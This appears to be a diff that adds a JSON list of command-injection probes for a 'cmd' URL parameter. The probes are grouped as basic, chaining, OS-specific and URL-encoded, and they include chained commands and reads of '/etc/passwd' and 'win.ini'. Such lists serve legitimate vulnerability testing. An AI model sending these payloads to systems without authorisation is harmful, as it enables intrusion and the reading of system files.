@@ -1,0 +1,21 @@
+{
+    "basic": [
+        "?cmd=ls",
+        "?cmd=whoami",
+        "?cmd=ping+-c+1+127.0.0.1"
+    ],
+    "chaining": [
+        "?cmd=ls;whoami",
+        "?cmd=whoami|id",
+        "?cmd=ping -c 1 127.0.0.1 && echo vulnerable"
+    ],
+    "os_specific": [
+        "?cmd=dir",
+        "?cmd=type+C:\\Windows\\win.ini",
+        "?cmd=cat+/etc/passwd"
+    ],
+    "encoded": [
+        "?cmd=ls%26%26whoami",
+        "?cmd=ping%20-c%201%20127.0.0.1"
+    ]
+}
